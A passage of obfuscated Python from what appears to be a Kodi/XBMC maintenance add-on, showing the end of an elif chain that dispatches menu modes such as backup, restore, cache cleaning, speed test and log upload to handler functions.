elif OOoOoOO == 'grab_addons' : oooOO00oo0 ( i1i1iIiiI1Ii1 )
elif OOoOoOO == 'grab_builds' : OO0oOo ( i1i1iIiiI1Ii1 )
elif OOoOoOO == 'guisettingsfix' : I111I1iii11 ( i1i1iIiiI1Ii1 , local )
elif OOoOoOO == 'helix' : I1III1I1IiI ( )
elif OOoOoOO == 'hide_passwords' : i1OooO00oO00o ( )
elif OOoOoOO == 'ipcheck' : i1IiIiiiii11 ( )
elif OOoOoOO == 'install_from_zip' : O00O ( )
elif OOoOoOO == 'instructions' : Instructions ( )
elif OOoOoOO == 'instructions_1' : oo0oOoo ( )
elif OOoOoOO == 'instructions_2' : oOOo0O0Oo ( )
elif OOoOoOO == 'instructions_3' : iIi1i1I1I ( )
elif OOoOoOO == 'instructions_4' : O0O0o0o0oo0O ( )
elif OOoOoOO == 'instructions_5' : I1ii ( )
elif OOoOoOO == 'instructions_6' : Instructions_6 ( )
elif OOoOoOO == 'keywords' : i1I1iii1I11II ( i1i1iIiiI1Ii1 )
elif OOoOoOO == 'kill_xbmc' : IiII1 ( )
elif OOoOoOO == 'kodi_settings' : o00OoOo0 ( )
elif OOoOoOO == 'local_backup' : oOOO ( )
elif OOoOoOO == 'LocalGUIDialog' : oOO0o0o0 ( )
elif OOoOoOO == 'log' : O00OO0oO ( )
elif OOoOoOO == 'login_check' : ooI1111 ( )
elif OOoOoOO == 'manual_search' : iIi1i111ii1II11ii ( i1i1iIiiI1Ii1 )
elif OOoOoOO == 'nan_menu' : ooI1 ( )
elif OOoOoOO == 'news_root_menu' : News_Root_Menu ( i1i1iIiiI1Ii1 )
elif OOoOoOO == 'news_menu' : News_Menu ( i1i1iIiiI1Ii1 )
elif OOoOoOO == 'open_system_info' : oO0OOO ( )
elif OOoOoOO == 'open_filemanager' : iIiIII ( )
elif OOoOoOO == 'openelec_backup' : I1i11i ( )
elif OOoOoOO == 'openelec_settings' : i1iIiII1 ( )
elif OOoOoOO == 'play_video' : yt . PlayVideo ( i1i1iIiiI1Ii1 )
elif OOoOoOO == 'register' : O000o ( )
elif OOoOoOO == 'remove_addon_data' : i11i1IiIi ( )
elif OOoOoOO == 'remove_addons' : oO0Oo0O0 ( i1i1iIiiI1Ii1 )
elif OOoOoOO == 'remove_build' : II1IiI11I1 ( )
elif OOoOoOO == 'remove_crash_logs' : OOOOooO0oOoO ( )
elif OOoOoOO == 'remove_nag' : OOo0OOoo00 ( )
elif OOoOoOO == 'remove_packages' : IIiI1IiI1iIi1 ( )
elif OOoOoOO == 'remove_textures' : OoOoO0ooooO0 ( )
elif OOoOoOO == 'restore' : RESTORE ( )
elif OOoOoOO == 'restore_backup' : i1IO0OoO0o ( OOo0 , i1i1iIiiI1Ii1 , OOO0oOoO0O )
elif OOoOoOO == 'restore_community' : OoO00oooo0o ( OOo0 , i1i1iIiiI1Ii1 , ooO0oOOooOo0 , OOO0oOoO0O , iiIIi11ii1Ii , iIIii1iiiIiiI , o0o0ooOOo0oO )
elif OOoOoOO == 'restore_local_CB' : Oooo0o0oO ( i1i1iIiiI1Ii1 )
elif OOoOoOO == 'restore_local_gui' : OoOo00oOoo0oO ( )
elif OOoOoOO == 'restore_local_OE' : I1i111II ( )
elif OOoOoOO == 'restore_openelec' : IIi ( OOo0 , i1i1iIiiI1Ii1 , ooO0oOOooOo0 )
elif OOoOoOO == 'restore_option' : O0OOo00OO ( )
elif OOoOoOO == 'restore_zip' : IiI1i1 ( i1i1iIiiI1Ii1 )
elif OOoOoOO == 'run_addon' : Ooo0oOOO ( i1i1iIiiI1Ii1 )
elif OOoOoOO == 'runtest' : speedtest . runtest ( i1i1iIiiI1Ii1 )
elif OOoOoOO == 'search_addons' : i1I1IiiIIIiiI ( i1i1iIiiI1Ii1 )
elif OOoOoOO == 'search_builds' : i11iiiiiIi1 ( i1i1iIiiI1Ii1 )
elif OOoOoOO == 'showinfo' : OO00oOO ( i1i1iIiiI1Ii1 )
elif OOoOoOO == 'showinfo2' : OOOO00oO ( i1i1iIiiI1Ii1 )
elif OOoOoOO == 'SortBy' : O0ooO0 ( BuildURL , type )
elif OOoOoOO == 'speed_instructions' : oOO0oOooooO ( )
elif OOoOoOO == 'speedtest_menu' : I111I1 ( )
elif OOoOoOO == 'switch_profile_menu' : o000oOOO ( i1i1iIiiI1Ii1 )
elif OOoOoOO == 'switch_profile' : i1iI11IiII ( i1i1iIiiI1Ii1 )
elif OOoOoOO == 'text_guide' : oOoooO0O0oOO ( i1i1iIiiI1Ii1 )
elif OOoOoOO == 'toggleaddon' : oO0oOO000 , I1iII1II1I1ii = i1i1iIiiI1Ii1 . split ( '[]' ) ; O00o0OO0O ( oO0oOO000 , I1iII1II1I1ii ) ; xbmc . executebuiltin ( 'Container.Refresh' )
elif OOoOoOO == 'tools' : oo00oo ( )
elif OOoOoOO == 'tools_addons' : IiiIIiIii ( )
elif OOoOoOO == 'tools_clean' : OO0OOOOOOoo ( )
elif OOoOoOO == 'tools_misc' : OOOO0000 ( )
elif OOoOoOO == 'tutorial_root_menu' : xbmc . executebuiltin ( 'ActivateWindow(Videos, plugin://plugin.video.nantuts, return)' )
elif OOoOoOO == 'unhide_passwords' : iI11i1II ( )
elif OOoOoOO == 'update' : OoOOo0OOoO ( )
elif OOoOoOO == 'update_community' : O0OoOOo0o ( OOo0 , i1i1iIiiI1Ii1 , ooO0oOOooOo0 , OOO0oOoO0O , iiIIi11ii1Ii , iIIii1iiiIiiI , o0o0ooOOo0oO )
elif OOoOoOO == 'uploadlog' : iiIiiIi1iiiIi ( )
elif OOoOoOO == 'user_info' : iiiIiii11i1i ( )
elif OOoOoOO == 'xbmc_menu' : XBMC_Menu ( i1i1iIiiI1Ii1 )
elif OOoOoOO == 'xbmcversion' : OOoO0OOO00 ( i1i1iIiiI1Ii1 )
elif OOoOoOO == 'wipe_xbmc' : OOooOooOOoO0O ( OOoOoOO )
xbmcplugin . endOfDirectory ( int ( sys . argv [ 1 ] ) ) # dd678faae9ac167bc83abf78e5cb2f3f0688d3a3
')